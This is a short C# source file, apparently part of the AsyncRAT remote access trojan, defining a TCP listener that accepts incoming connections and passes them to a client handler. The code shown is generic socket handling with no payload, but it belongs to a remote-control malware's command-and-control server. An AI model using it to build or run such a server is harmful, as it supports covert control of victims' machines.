using System.Threading.Tasks;
using System.Net;
using System.Net.Sockets;
using System;
using System.Windows.Forms;

namespace AsyncRAT_Sharp.Sockets
{
    class Listener
    {
        private Socket Server { get; set; }

        public void Connect(object port)
        {
            try
            {
                IPEndPoint IpEndPoint = new IPEndPoint(IPAddress.Any, Convert.ToInt32(port));
                Server = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp)
                {
                    SendBufferSize = 50 * 1024,
                    ReceiveBufferSize = 50 * 1024,
                    ReceiveTimeout = -1,
                    SendTimeout = -1,
                };
                Server.Bind(IpEndPoint);
                Server.Listen(20);
                Server.BeginAccept(EndAccept, null);
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
                Environment.Exit(0);
            }
        }

        private void EndAccept(IAsyncResult ar)
        {
            try
            {
                Clients CL = new Clients(Server.EndAccept(ar));
                Server.BeginAccept(EndAccept, null);
            }
            catch { }
        }
    }
}
